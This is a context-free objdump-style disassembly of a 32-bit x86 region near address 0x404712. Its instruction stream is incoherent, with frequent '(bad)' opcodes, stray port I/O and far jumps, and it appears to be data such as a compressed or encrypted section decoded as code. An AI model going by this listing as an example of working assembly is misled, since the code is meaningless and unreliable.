  404712:	mov    eax,0x1722d7cc
  404717:	mov    ch,0x7b
  404719:	test   BYTE PTR [ebx+0x53593443],cl
  40471f:	or     al,0x35
  404721:	ss fsub st(7),st
  404724:	pop    esi
  404725:	fcom   DWORD PTR [edx-0x1e28be43]
  40472b:	inc    ebp
  40472c:	sbb    BYTE PTR [esi],0x4a
  40472f:	add    BYTE PTR ss:[eax-0x4c],bl
  404733:	fnstsw WORD PTR [eax+0x3eee5c73]
  404739:	push   cs
  40473a:	ror    DWORD PTR [edx-0x285af784],0xa
  404741:	loopne 0x4046d9
  404743:	add    BYTE PTR [ebx+0x402902a9],ah
  404749:	pop    ebx
  40474a:	and    bl,BYTE PTR [edx]
  40474c:	and    al,0xcd
  40474e:	(bad)  
  40474f:	or     cl,ch
  404751:	dec    ebp
  404752:	mov    eax,ds:0x8264ac4b
  404757:	or     DWORD PTR [ebp+0x1f9fbe9e],ebp
  40475d:	stc    
  40475e:	stc    
  40475f:	ret    0x2a85
  404762:	call   0xf602:0xc174616
  404769:	and    al,0xff
  40476b:	aas    
  40476c:	sub    BYTE PTR [esi+esi*2],cl
  40476f:	jns    0x404719
  404771:	mov    ah,0x4a
  404774:	jmp    DWORD PTR [ebp-0x26234940]
  40477a:	and    DWORD PTR [ebx-0xc],edi
  40477d:	popf   
  40477e:	test   BYTE PTR [ebp-0x4697286d],0x9d
  404785:	jmp    0x404806
  404787:	xchg   BYTE PTR [ebp+0x4db1df4e],ch
  40478d:	aam    0x90
  40478f:	(bad)  
  404791:	sti    
  404792:	xor    DWORD PTR [eax+eiz*4],esi
  404795:	xor    al,0xca
  404797:	loop   0x404818
  404799:	pop    edi
  40479a:	call   0x7d12:0xae1e3c25
  4047a1:	mov    DWORD PTR [ebx],ecx
  4047a3:	into   
  4047a4:	push   ebx
  4047a5:	rol    DWORD PTR [edx-0x746ef646],1
  4047ab:	lea    esp,[edi+eiz*8+0x18ae84db]
  4047b2:	sar    ebx,0xac
  4047b5:	pop    edx
  4047b6:	jnp    0x40473d
  4047b8:	pop    edx
  4047b9:	mov    eax,0x68713fa6
  4047be:	xor    eax,0xe75d85a4
  4047c3:	cmc    
  4047c4:	push   0xcdc59e7e
  4047c9:	outs   dx,BYTE PTR ds:[esi]
  4047ca:	in     eax,dx
  4047cb:	test   eax,0xdf98912b
  4047d0:	adc    BYTE PTR [eax+edi*4-0x53645345],al
  4047d7:	xor    DWORD PTR [edx-0x71173ac8],eax
  4047dd:	or     ch,BYTE PTR [edx]
  4047df:	sbb    esi,esp
  4047e1:	in     al,dx
  4047e2:	sub    ah,dl
  4047e4:	adc    al,0xf0
  4047e6:	xchg   edx,eax
  4047e7:	pop    ebp
  4047e8:	cpuid  
  4047ea:	retf   
  4047eb:	ret    
  4047ec:	push   0x1f339559
  4047f1:	push   0xaa7bbe84
  4047f6:	mov    ds:0xfb9e7840,eax
  4047fb:	into   
  4047fc:	into   
  4047fd:	cs stos DWORD PTR es:[di],eax
  404800:	popa   
  404801:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404802:	and    eax,0x1bcef276
  404807:	test   BYTE PTR [edi],ch
  404809:	jbe    0x4047eb
  40480b:	dec    ebp
  40480c:	out    0x96,eax
  40480e:	mov    ch,0xb4
  404810:	pop    esi
  404811:	dec    ebp
  404812:	push   cs
  404813:	push   edi
  404814:	sub    eax,DWORD PTR [ebp+0x3c]
  404817:	aam    0x64
  404819:	push   edx
  40481a:	std    
  40481b:	xchg   edi,eax
  40481c:	mov    ecx,0xbb39293b
  404821:	outs   dx,DWORD PTR ds:[esi]
  404822:	add    BYTE PTR [esi-0x5c],cl
  404825:	mov    dh,0x6c
  404827:	jne    0x4048a8
  404829:	popa   
  40482a:	daa    
  40482b:	inc    eax
  40482c:	pop    es
  40482d:	mov    BYTE PTR [edx],dl
  40482f:	jb     0x40485d
  404831:	cmp    esp,DWORD PTR [esi]
  404833:	pop    esp
  404834:	jge    0x404807
  404836:	dec    edi
  404837:	cmp    al,0x41
  404839:	jl     0x40486f
  40483b:	dec    eax
  40483c:	call   0xccb8:0x13153d64
  404843:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404844:	mov    ch,0x9c
  404846:	mov    esp,0x19263537
  40484b:	jo     0x4047e3
  40484d:	sub    eax,0x218443d3
  404852:	and    ebp,eax
  404854:	mov    DWORD PTR [ebp-0xa],edx
  404857:	or     BYTE PTR [edx+0x4d],al
  40485a:	inc    ebp
  40485b:	xor    DWORD PTR [ebx+0x6d],ecx
  40485e:	in     al,dx
  40485f:	mov    dl,al
  404861:	out    dx,eax
  404862:	(bad)  
  404863:	adc    al,BYTE PTR [edx+0x6b873222]
  404869:	push   ecx
  40486a:	call   0x9e8a:0x6fabef18
  404871:	push   esi
  404872:	mov    edx,0x93af36d8
  404877:	mov    ds:0x833dcd45,eax
  40487c:	fucom  st(2)
  40487e:	sub    cl,ch
  404880:	xchg   BYTE PTR [ecx+0x9],bl
  404883:	aas    
  404884:	xor    dh,dl
  404886:	pusha  
  404887:	jbe    0x404822
  404889:	inc    eax
  40488a:	shl    bh,0x1c
  40488d:	xchg   ecx,eax
  40488e:	xor    al,0x4e
  404890:	cmp    al,0x95
  404892:	push   eax
  404893:	adc    DWORD PTR gs:[ebp-0x7c],0x46d3452a
  40489b:	adc    al,0x4d
  40489d:	aad    0x26
  40489f:	test   esp,ecx
  4048a1:	dec    ebx
  4048a2:	jo     0x404898
  4048a4:	sbb    BYTE PTR [ebp+0x19],dh
  4048a7:	in     al,dx
  4048a8:	sbb    ecx,edi
  4048aa:	fdivr  DWORD PTR [esi-0x52]
  4048ad:	xlat   BYTE PTR ds:[ebx]
  4048ae:	and    al,BYTE PTR [ecx+0x14ec5103]
  4048b4:	add    dl,BYTE PTR [ebp+0x386a1529]
  4048ba:	enter  0xace9,0xa9
  4048be:	fsub   DWORD PTR [esp+edi*4]
  4048c1:	xor    eax,DWORD PTR [eax]
  4048c3:	cdq    
  4048c4:	push   ebx
  4048c5:	xchg   ebx,eax
  4048c6:	or     al,0xc2
  4048c8:	mov    ebx,0xa973134b
  4048cd:	adc    esp,DWORD PTR fs:[ebx+0x73815b91]
  4048d4:	xor    edx,DWORD PTR ds:0xd9616437
  4048da:	rol    BYTE PTR [esi+0xc],1
  4048dd:	inc    esp
  4048de:	sahf   
  4048df:	jle    0x404905
  4048e1:	lods   eax,DWORD PTR ds:[esi]
  4048e2:	lock mov eax,ds:0xf9a8d680
  4048e8:	sete   bh
  4048eb:	pop    esi
  4048ec:	or     cl,ch
  4048ee:	cmc    
  4048ef:	xor    ebx,DWORD PTR [ebx]
  4048f1:	xchg   edi,eax
  4048f2:	scas   al,BYTE PTR es:[edi]
  4048f3:	imul   ebx,ebx,0x5885e56f
  4048f9:	ret    
  4048fa:	add    al,BYTE PTR [ecx-0x2d]
  4048fd:	adc    al,BYTE PTR [eax]
  4048ff:	out    0xd3,eax
  404901:	xor    al,0x16
  404903:	ins    DWORD PTR es:[edi],dx
  404904:	das    
  404905:	test   al,0xe8
  404907:	mov    bl,0x11
  404909:	stos   BYTE PTR es:[edi],al
  40490a:	or     al,BYTE PTR [edi]
  40490c:	sub    eax,0x3d9a9874
  404911:	sbb    BYTE PTR [ebx],dl
  404913:	sbb    dl,BYTE PTR [ebx-0xe]
  404916:	(bad)  
  404917:	mov    bl,0x71
  404919:	mov    WORD PTR [edi+0x26],fs
  40491c:	dec    eax
  40491d:	jae    0x4048a7
  40491f:	jns    0x404983
  404921:	pop    ecx
  404922:	(bad)  
  404923:	jno    0x4048c8
  404925:	jo     0x40495e
  404927:	add    BYTE PTR [ebx+0x4df634ad],0x8f
  40492e:	(bad)  
  40492f:	nop
  404930:	pop    esp
  404931:	cli    
  404932:	ret    0x63d8
  404935:	push   esp
  404936:	test   al,0x30
  404938:	scas   al,BYTE PTR es:[edi]
  404939:	mov    BYTE PTR [edi-0x7d],0x27
  40493d:	mov    bl,0x54
  40493f:	cwde   
  404940:	push   ebx
  404941:	(bad)  
  404942:	enter  0x7d0c,0x10
  404946:	pushf  
  404947:	adc    bl,al
  404949:	jmp    FWORD PTR [ebx+0x8]
  40494c:	into   
  40494d:	dec    edi
  40494e:	xlat   BYTE PTR ds:[ebx]
  40494f:	dec    esp
  404950:	push   edx
  404951:	push   edi
  404952:	sbb    eax,0xef394342
  404957:	fnsave [ebp+0x29]
  40495a:	xor    BYTE PTR [esp+edi*4-0x55],dh
  40495e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40495f:	scas   eax,DWORD PTR es:[edi]
  404960:	push   edx
  404961:	dec    esp
  404962:	aad    0xed
  404964:	sbb    dh,BYTE PTR ss:0xa905146f
  40496b:	sub    ecx,esp
  40496d:	xlat   BYTE PTR ds:[ebx]
  40496e:	pop    edi
  40496f:	xor    ebx,DWORD PTR [ebx]
  404971:	imul   edx,DWORD PTR [eax+0x60fac890],0x5e
  404978:	xchg   edx,eax
  404979:	mov    ebx,0x9bca26fa
  40497e:	ja     0x4049bc
  404980:	nop
  404981:	mov    bh,0x4e
  404983:	jp     0x40491f
  404985:	xor    bl,BYTE PTR [eax+esi*8]
  404988:	test   al,0xb2
  40498a:	cld    
  40498b:	call   0x3684:0x8d58edf
  404992:	bound  ebx,QWORD PTR [edi+0x47d7c9b9]
  404998:	fwait
  404999:	ins    DWORD PTR es:[edi],dx
  40499a:	outs   dx,DWORD PTR ds:[esi]
  40499b:	push   edi
  40499c:	add    eax,0x51931422
  4049a1:	inc    eax
  4049a2:	xchg   DWORD PTR [ebp-0x444315ef],esi
  4049a8:	test   BYTE PTR [eax-0xb041931],dh
  4049ae:	inc    esi
  4049af:	dec    BYTE PTR [esi+0x3a]
  4049b2:	mov    WORD PTR [ecx-0x41],fs
  4049b5:	mov    ebp,0x658e0e1f
  4049ba:	dec    edx
  4049bb:	and    eax,0x17cc0d1f
  4049c0:	inc    ebp
  4049c1:	leave  
  4049c2:	in     al,dx
  4049c3:	mov    ds:0xe486adff,eax
  4049c8:	ja     0x4049fd
  4049ca:	and    ecx,DWORD PTR [ecx+0x637f527b]
  4049d0:	inc    eax
  4049d1:	rcl    DWORD PTR [edi+edi*2+0x7aef2f8e],cl
  4049d8:	fistp  QWORD PTR [edx]
  4049da:	adc    DWORD PTR [ecx-0x65f2444e],eax
  4049e0:	jg     0x404a27
  4049e2:	pop    edi
  4049e3:	mov    ch,0xe7
  4049e5:	xchg   esi,eax
  4049e6:	mov    dl,0xb1
  4049e8:	push   ss
  4049e9:	retf   0x7a85
  4049ec:	addr16 ds dec ecx
  4049ef:	cld    
  4049f0:	fiadd  DWORD PTR [ecx+edx*8+0x7f0d23e2]
  4049f7:	or     eax,0xcac26146
  4049fc:	fiadd  DWORD PTR ds:0xfdd48cca
  404a02:	or     bl,BYTE PTR [ebp+eax*8+0x486ad7d7]
  404a09:	shr    DWORD PTR [edx-0x48dd1d58],cl
  404a0f:	pusha  
  404a10:	jmp    0x404a30
  404a12:	in     al,dx
  404a13:	pop    eax
  404a14:	lods   al,BYTE PTR ds:[esi]
  404a15:	gs dec esp
  404a17:	xchg   ebp,eax
  404a18:	add    BYTE PTR [edi-0xa],ch
  404a1b:	lock popa 
  404a1d:	lods   al,BYTE PTR ds:[esi]
  404a1e:	pop    ds
  404a1f:	ss sub eax,ebx
  404a22:	adc    eax,0x4e6c5be5
  404a27:	pop    ecx
  404a28:	(bad)  
  404a2c:	loopne 0x404a72
  404a2e:	ins    DWORD PTR es:[edi],dx
  404a2f:	xchg   esi,eax
  404a30:	sahf   
  404a31:	mov    al,0xff
  404a33:	in     eax,dx
  404a34:	fldcw  WORD PTR [edx+0x24]
  404a37:	xchg   edx,ebp
  404a39:	jbe    0x4049c5
  404a3b:	sub    esi,DWORD PTR [ebx+0x345d8833]
  404a41:	icebp  
  404a42:	arpl   WORD PTR [edi-0x26701ba6],di
  404a48:	out    0x4f,eax
  404a4a:	sar    bl,0x8
  404a4d:	dec    esp
  404a4e:	push   edi
  404a4f:	cmp    BYTE PTR [edi+0x4856c457],bl
  404a55:	fiadd  WORD PTR [edi+0x38]
  404a58:	dec    ebx
  404a59:	sub    ebp,esi
  404a5b:	sbb    ch,BYTE PTR [edi-0x41ac4fa0]
  404a61:	ins    BYTE PTR es:[edi],dx
  404a62:	xor    edx,DWORD PTR fs:[ecx]
  404a65:	inc    ebp
  404a66:	popa   
  404a67:	push   esp
  404a68:	sahf   
  404a69:	and    BYTE PTR [eax-0x7],dh
  404a6c:	jno    0x404a85
  404a6e:	push   ds
  404a6f:	dec    edi
  404a70:	test   BYTE PTR ss:[ecx-0x198f430f],dh
  404a77:	std    
  404a78:	and    al,0x9c
  404a7a:	data16 mov al,ds:0x200542db
  404a80:	push   ecx
  404a81:	pop    ecx
  404a82:	ins    BYTE PTR es:[edi],dx
  404a83:	add    ah,ch
  404a85:	xor    BYTE PTR [ebx-0x7b396cbc],cl
  404a8b:	std    
  404a8c:	test   al,0x12
  404a8e:	fldenv [ecx+0x54]
  404a91:	into   
  404a92:	popf   
  404a93:	mov    edx,0xb371c796
  404a98:	dec    edx
  404a99:	pop    esi
  404a9a:	ret    0xba3f
  404a9d:	xchg   ecx,eax
  404a9e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404a9f:	push   ebp
  404aa0:	xor    DWORD PTR [edx+0x5a20e08f],edi
  404aa6:	(bad)  
  404aa8:	adc    dl,BYTE PTR [eax+0x39]
  404aab:	cmp    BYTE PTR [ecx+0x42085b8f],bh
  404ab1:	loop   0x404b1c
  404ab3:	or     al,0xf0
  404ab5:	jne    0x404af3
  404ab7:	sbb    eax,0x6e92a207
  404abc:	mov    ebp,0xe63f3d6b
  404ac1:	adc    DWORD PTR [edi+0x5f],eax
  404ac4:	push   es
  404ac5:	popa   
  404ac6:	fs das 
  404ac8:	mov    ds:0xb0c36a3c,al
  404acd:	xchg   DWORD PTR [edi-0x55b77bbc],ebp
  404ad3:	cwde   
  404ad4:	enter  0x1e67,0x19
  404ad8:	jne    0x404a83
  404ada:	int3   
  404adb:	cmc    
  404adc:	jbe    0x404a7f
  404ade:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404adf:	loop   0x404a62
  404ae1:	and    ebp,0x81083183
  404ae7:	dec    edi
  404ae8:	test   eax,0xf86f4ef8
  404aed:	push   esi
  404aee:	add    bl,dl
  404af0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404af1:	cdq    
  404af2:	cmp    edi,0xb0c01907
  404af8:	dec    ecx
  404af9:	int    0xbb
  404afb:	push   0x4d9222a2
  404b00:	mov    dl,0x95
  404b02:	sub    bh,cl
  404b04:	out    dx,eax
  404b05:	fistp  DWORD PTR [ecx-0x11]
  404b08:	mov    DWORD PTR [edi+0x2],edi
  404b0b:	pop    esp
  404b0c:	iret   
  404b0d:	pop    esp
  404b0e:	push   0xdcfd41b3
  404b13:	mov    dh,0xc4
  404b15:	and    DWORD PTR [esi+0x5d],ebx
  404b18:	jg     0x404af9
  404b1a:	stos   DWORD PTR es:[edi],eax
  404b1b:	lahf   
  404b1c:	clc    
  404b1d:	test   al,0x21
  404b1f:	lock push 0x1348a8ce
  404b25:	mov    al,ds:0x2c04d34d
  404b2a:	clc    
  404b2b:	rol    BYTE PTR [esi+0x52],0x6d
  404b2f:	pusha  
  404b30:	leave  
  404b31:	inc    eax
  404b32:	ficomp WORD PTR [esi-0x66adc1d9]
  404b38:	jb     0x404b94
  404b3a:	xor    ecx,DWORD PTR [esp+edx*1]
  404b3d:	(bad)  
  404b3e:	mov    bh,0x6d
  404b40:	sub    DWORD PTR [edi+0x46],ecx
  404b43:	mov    bh,0x58
  404b45:	popa   
  404b46:	inc    ecx
  404b47:	or     ebp,DWORD PTR [ebx+esi*1]
  404b4a:	ficom  DWORD PTR [ebx]
  404b4c:	dec    edi
  404b4d:	scas   eax,DWORD PTR es:[edi]
  404b4e:	and    dh,BYTE PTR [esi+0xc]
  404b51:	push   eax
  404b52:	fcmove st,st(3)
  404b54:	stos   DWORD PTR es:[edi],eax
  404b55:	xor    dh,bh
  404b57:	imul   ecx,DWORD PTR [ecx+0x24c7a422],0xffffffb6
  404b5e:	mov    ds:0x52718ecc,eax
  404b63:	icebp  
  404b64:	pop    ecx
  404b65:	test   DWORD PTR [edx-0x5d],esp
  404b68:	push   eax
  404b69:	xor    DWORD PTR [ebp-0x70],esi
  404b6c:	stos   BYTE PTR es:[edi],al
  404b6d:	mov    ds:0x7d80cdb0,eax
  404b72:	into   
  404b73:	retf   0xa9a0
  404b76:	xor    BYTE PTR [esi-0x7d2b69a8],bh
  404b7c:	(bad)  
  404b7e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404b7f:	enter  0x8324,0xa0
  404b83:	dec    edi
  404b84:	(bad)  
  404b85:	or     eax,0x4cd46f23
  404b8a:	aad    0x64
  404b8c:	xchg   bl,bh
  404b8e:	lock ret 
  404b90:	loop   0x404b87
  404b92:	enter  0x7fb1,0x19
  404b96:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404b97:	(bad)  
  404b98:	int    0x99
  404b9a:	push   ds
  404b9b:	fcomp  QWORD PTR [ecx]
  404b9d:	mov    ecx,0x600d6c90
  404ba2:	jne    0x404c21
  404ba4:	out    0x54,eax
  404ba6:	jmp    0x2a3110bf
  404bab:	xchg   ecx,eax
  404bac:	inc    edx
  404bad:	sahf   
  404bae:	bound  ecx,QWORD PTR [eax+0x4f841e3a]
  404bb4:	hlt    
  404bb5:	mov    edi,DWORD PTR [edi-0x5b7a7808]
  404bbb:	fwait
  404bbc:	out    0xf,al
  404bbe:	leave  
  404bbf:	push   ds
  404bc0:	xor    eax,0x63fb65f4
  404bc5:	xor    al,0xef
  404bc7:	(bad)  
  404bc8:	mov    ds:0x21c0afdd,eax
  404bcd:	pusha  
  404bce:	mov    esi,0xc24d6d1
  404bd3:	or     eax,0x2f13e49c
  404bd8:	sbb    al,0x7f
  404bda:	(bad)  
  404bdb:	pushf  
  404bdc:	daa    
  404bdd:	mov    al,0x7a
  404bdf:	sub    DWORD PTR [ebx-0x6f],ecx
  404be2:	in     al,dx
  404be3:	xor    al,0x17
  404be5:	cmovp  esp,esi
  404be8:	mov    bh,0x66
  404bea:	jae    0x404c10
  404bec:	and    bl,BYTE PTR [eax-0x691641fe]
  404bf2:	jg     0x404b81
  404bf4:	ret    
  404bf5:	retf   
  404bf6:	ss mov eax,0x8891176f
  404bfc:	inc    esi
  404bfd:	iret   
  404bfe:	loope  0x404bfe
  404c00:	out    0x7c,al
  404c02:	fcompp 
  404c04:	cmp    BYTE PTR [ecx],bl
  404c06:	xchg   edx,eax
  404c07:	leave  
  404c08:	pop    esp
  404c09:	(bad)  
  404c0b:	lods   eax,DWORD PTR ds:[esi]
  404c0c:	jmp    0x404c2e
  404c0e:	imul   ecx
  404c10:	push   edi
  404c11:	push   ebx
  404c12:	int3   
  404c13:	ins    DWORD PTR es:[edi],dx
  404c14:	xlat   BYTE PTR ds:[ebx]
  404c15:	mov    esp,0xe9a3733f
  404c1a:	les    eax,FWORD PTR [ebx-0x4c]
  404c1d:	add    BYTE PTR [edi-0x50],bl
  404c20:	mov    bl,0x36
  404c22:	sbb    eax,ebp
  404c24:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404c25:	mov    ecx,DWORD PTR [edx+eax*8+0x50]
  404c29:	in     eax,0x2
  404c2b:	fisubr WORD PTR [esi+ebp*2+0x4bba25f4]
  404c32:	adc    ebx,DWORD PTR [esi]
  404c34:	xlat   BYTE PTR ds:[ebx]
  404c35:	(bad)  
  404c36:	mov    BYTE PTR [edi-0x43482d82],ah
  404c3c:	sbb    ebx,esp
  404c3e:	xchg   ebx,eax
  404c3f:	(bad)  
  404c40:	lods   eax,DWORD PTR ds:[esi]
  404c41:	push   edi
  404c42:	adc    esi,DWORD PTR [edi-0x65]
  404c45:	lds    esp,FWORD PTR [ebp-0x36]
  404c48:	dec    ebp
  404c49:	jecxz  0x404c9a
  404c4b:	data16 add al,0x4f
  404c4e:	mov    esp,0x6bd719b5
  404c53:	mov    edi,0x314fc1a
  404c58:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404c59:	mov    edx,0xb25710db
  404c5e:	(bad)  
  404c5f:	icebp  
  404c60:	nop
  404c61:	into   
  404c62:	mov    dh,0xd7
  404c64:	sahf   
  404c65:	dec    ecx
  404c66:	xchg   ebp,eax
  404c67:	mov    DWORD PTR [edi+edx*4-0x3b],eax
  404c6b:	add    eax,DWORD PTR ds:[ecx+0x6a]
  404c6f:	mov    BYTE PTR [edx+0x5a],dl
  404c72:	sub    cl,bh
  404c74:	sbb    DWORD PTR [ecx],ebx
  404c76:	cmp    eax,0x2952062e
  404c7b:	std    
  404c7c:	mov    bh,0x23
  404c7e:	push   ecx
  404c7f:	fimul  WORD PTR [edx+ecx*1]
  404c82:	icebp  
  404c83:	icebp  
  404c84:	fwait
  404c85:	xor    BYTE PTR [eax],0x78
  404c88:	add    DWORD PTR [edx-0x2],edi
  404c8b:	ins    BYTE PTR es:[edi],dx
  404c8c:	jno    0x404c28
  404c8e:	mov    ah,0xa9
  404c90:	mov    edi,DWORD PTR [edi+esi*1+0x7bf72265]
  404c97:	mov    edx,0x1a36ea84
  404c9c:	mov    BYTE PTR [ecx],bh
  404c9e:	shr    BYTE PTR [esi],0xfd
  404ca1:	jmp    0x47ca69e0
  404ca6:	add    BYTE PTR [esi+0x5d],bl
  404ca9:	inc    esi
  404caa:	pop    eax
  404cab:	mov    eax,0x960e4b28
  404cb0:	mov    ah,0x47
  404cb2:	js     0x404d1e
  404cb4:	add    eax,DWORD PTR [ecx]
  404cb6:	ss xchg edx,eax
  404cb8:	retf   0x71b6
  404cbb:	fisttp WORD PTR [eax+0x3f]
  404cbe:	push   0x53
  404cc0:	dec    esp
  404cc1:	out    0x4c,al
  404cc3:	sub    dl,BYTE PTR [eax+ecx*4-0x4ccc42b4]
  404cca:	pop    es
  404ccb:	jo     0x404cd8
  404ccd:	sub    DWORD PTR [ebp+edx*2-0x4d6b15c1],0x2f
  404cd5:	push   edi
  404cd6:	push   ebx
  404cd7:	pop    ss
  404cd8:	mov    cl,0xfb
  404cda:	scas   al,BYTE PTR es:[edi]
  404cdb:	js     0x404d4d
  404cdd:	inc    esi
  404cde:	xchg   esp,eax
  404cdf:	and    eax,0x3ad92c60
  404ce4:	xchg   edx,eax
  404ce5:	mov    ecx,0x48f737fe
  404cea:	lods   al,BYTE PTR ds:[esi]
  404ceb:	mov    dl,0xe5
  404ced:	shr    DWORD PTR [esp+ebx*8-0x5715d67a],0xb6
  404cf5:	xchg   DWORD PTR [eax],ecx
  404cf7:	dec    ebp
  404cf8:	clc    
  404cf9:	(bad)  
  404cfa:	fistp  WORD PTR [edi+eiz*8-0x37]
  404cfe:	arpl   WORD PTR [esi-0x7f],di
  404d01:	xor    bl,ah
  404d03:	push   cs
  404d04:	or     edx,DWORD PTR [ebp-0x2386853b]
  404d0a:	out    0x52,eax
  404d0c:	int3   
  404d0d:	push   edi
  404d0e:	std    
  404d0f:	aam    0x36
  404d11:	test   al,0xc4
  404d13:	stos   BYTE PTR es:[edi],al
  404d14:	mov    ecx,0x6b8d17a5
  404d19:	out    0xa,eax
  404d1b:	fist   DWORD PTR [ebp-0x1f]
  404d1e:	cmp    bh,ch
  404d20:	xchg   edx,eax
  404d21:	cmp    al,0x39
  404d23:	(bad)  
  404d24:	nop
  404d25:	cmp    al,0xfb
  404d27:	into   
  404d28:	fwait
  404d29:	repz clc 
  404d2b:	sub    DWORD PTR [edx-0x798abd34],edx
  404d31:	test   al,0xfd
  404d33:	test   DWORD PTR [eax],edx
  404d35:	icebp  
  404d36:	xchg   ebx,eax
  404d37:	das    
  404d38:	or     eax,0xa5f36b3e
  404d3d:	jp     0x404d39
  404d3f:	icebp  
  404d40:	jb     0x404cdf
  404d42:	or     dh,ah
  404d44:	test   al,0xb4
  404d46:	mov    bl,0x5c
  404d48:	mov    ch,0x46
  404d4a:	js     0x404cda
  404d4c:	fcmovnb st,st(6)
  404d4e:	sub    ah,0xa6
  404d51:	mov    al,ds:0x6c82c0c1
  404d56:	pop    esi
  404d57:	pop    eax
  404d58:	pushf  
  404d59:	popf   
  404d5a:	out    dx,al
  404d5b:	pop    esp
  404d5c:	add    edi,DWORD PTR [eax-0x9860ec6]
  404d62:	retf   
  404d63:	pop    ebp
  404d64:	cmc    
  404d65:	xor    DWORD PTR [esi+ecx*4],edx
  404d68:	dec    esi
  404d69:	scas   al,BYTE PTR es:[edi]
  404d6a:	xchg   ecx,eax
  404d6b:	leave  
  404d6c:	sbb    ch,bh
  404d6e:	sbb    ebp,edx
  404d70:	mov    BYTE PTR [ecx+edx*2-0x43195f1e],bl
  404d77:	and    al,0xa2
  404d79:	pop    esi
  404d7a:	dec    esp
  404d7b:	ret    0x83a1
  404d7e:	mov    bh,ah
  404d80:	jge    0x404d72
  404d82:	call   0xa8d4a518
  404d87:	fst    QWORD PTR [edi+0x3c]
  404d8a:	cdq    
  404d8b:	test   eax,0x28aac20e
  404d90:	push   es
  404d91:	xchg   eax,esp
  404d93:	ins    BYTE PTR es:[edi],dx
  404d94:	hlt    
  404d95:	in     al,0x69
  404d97:	mov    al,ds:0x18c4180e
  404d9c:	rcl    DWORD PTR [edx+0x3fe11ee5],0xa4
  404da3:	mov    bl,0xc9
  404da5:	pop    ss
  404da6:	call   0xd5f2:0x3b63006f
  404dad:	scas   eax,DWORD PTR es:[edi]
  404dae:	loopne 0x404d4e
  404db0:	jmp    0xf450:0x5321966c
  404db7:	cmp    esi,esi
  404db9:	cmp    eax,0xf53be48
  404dbe:	sbb    DWORD PTR [ecx+edi*8],ebx
  404dc1:	cld    
  404dc2:	in     al,0x34
  404dc4:	aas    
  404dc5:	mov    ah,0xfe
  404dc7:	ret    
  404dc8:	xchg   esi,eax
  404dc9:	sti    
  404dca:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404dcb:	fs test eax,0xf1be602d
  404dd1:	push   ds
  404dd2:	div    BYTE PTR [esi-0x4bc2149b]
  404dd8:	mov    bh,0x5b
  404dda:	fcom   st(2)
  404ddc:	lods   eax,DWORD PTR ds:[esi]
  404ddd:	xor    edx,ebx
  404ddf:	pop    edi
  404de0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404de1:	mov    WORD PTR [ecx-0x61904d81],cs
  404de7:	and    DWORD PTR [ecx+0x31],edi
  404dea:	and    bl,BYTE PTR [ebx]
  404dec:	xchg   esi,eax
  404ded:	es loope 0x404d9a
  404df0:	dec    ebx
  404df1:	push   ebp
  404df2:	and    BYTE PTR [ebp+0x12],dl
  404df5:	mov    edi,0xdd43911b
  404dfa:	(bad)  
  404dfb:	sub    eax,0x2e3104a0
  404e00:	js     0x404e34
  404e02:	inc    ebp
  404e03:	in     eax,0x33
  404e05:	pop    esp
  404e06:	cmp    eax,0xde832291
  404e0b:	xchg   BYTE PTR [edi-0x69],al
  404e0e:	add    dl,BYTE PTR [edx+0x7d]
  404e11:	stos   DWORD PTR es:[edi],eax
  404e12:	inc    esi
  404e13:	out    dx,al
  404e14:	sub    ecx,DWORD PTR [edi-0x43]
  404e17:	jcxz   0x404e06
  404e1a:	mov    esp,DWORD PTR [edx-0x31]
  404e1d:	xor    eax,0x4c05f830
  404e22:	stos   DWORD PTR es:[edi],eax
  404e23:	sbb    DWORD PTR [ebp+0x712f94bd],0xf
  404e2a:	leave  
  404e2b:	mov    esi,0x1be77390
  404e30:	pushf  
  404e31:	mov    BYTE PTR [ebp+0x3f],dh
  404e34:	stc    
  404e35:	xchg   esi,eax
  404e36:	rol    DWORD PTR [esi],1
  404e38:	aad    0xb
  404e3a:	(bad)  
  404e3b:	je     0x404e94
  404e3d:	mov    dl,0x94
  404e3f:	jp     0x404e0b
  404e41:	sbb    DWORD PTR [ebp-0x79a6aefe],ecx
  404e47:	bnd ss js 0x404e18
  404e4b:	iret   
  404e4c:	fnstcw WORD PTR [edx+ebx*2+0x66]
  404e50:	mov    eax,DWORD PTR [esi+0xe6a1bd8]
  404e56:	mov    dh,0xe5
  404e58:	or     DWORD PTR [esi],ebp
  404e5a:	(bad)  
  404e5b:	leave  
  404e5c:	loopne 0x404ecf
  404e5e:	arpl   WORD PTR [edi-0x4751b8b4],si
  404e64:	int3   
  404e65:	enter  0xfad8,0x80
  404e69:	xor    cl,BYTE PTR [eax+esi*1+0x70]
  404e6d:	fisub  WORD PTR [eax]
  404e6f:	iret   
  404e70:	adc    DWORD PTR [ecx+0x1e6b93b8],ecx
  404e76:	mov    esp,0x975c478d
  404e7b:	jo     0x404e40
  404e7d:	lods   eax,DWORD PTR ds:[esi]
  404e7e:	xor    esp,ebx
  404e80:	call   0x7fd87286
  404e85:	repnz sub ch,bl
  404e88:	outs   dx,BYTE PTR ds:[esi]
  404e89:	es dec ebp
  404e8b:	cmp    edx,DWORD PTR ds:0x22bfffed
  404e91:	mov    bh,0xbc
  404e93:	icebp  
  404e94:	(bad)  
  404e95:	mov    ds:0xd775816c,eax
  404e9a:	push   0x74
  404e9c:	cmp    eax,edi
  404e9e:	out    0x78,al
  404ea0:	sbb    BYTE PTR [eax+edi*4+0x41],al
  404ea4:	adc    cl,BYTE PTR [eax-0x17ecc78b]
  404eaa:	jl     0x404f16
  404eac:	inc    ebp
  404ead:	dec    eax
  404eae:	cmc    
  404eaf:	mov    eax,ds:0xe97e2c52
  404eb4:	and    ch,BYTE PTR ss:[ebx-0x2e0a32e5]
  404ebb:	xor    al,0x2e
  404ebd:	dec    esi
  404ebe:	push   ss
  404ebf:	inc    eax
  404ec0:	je     0x404e56
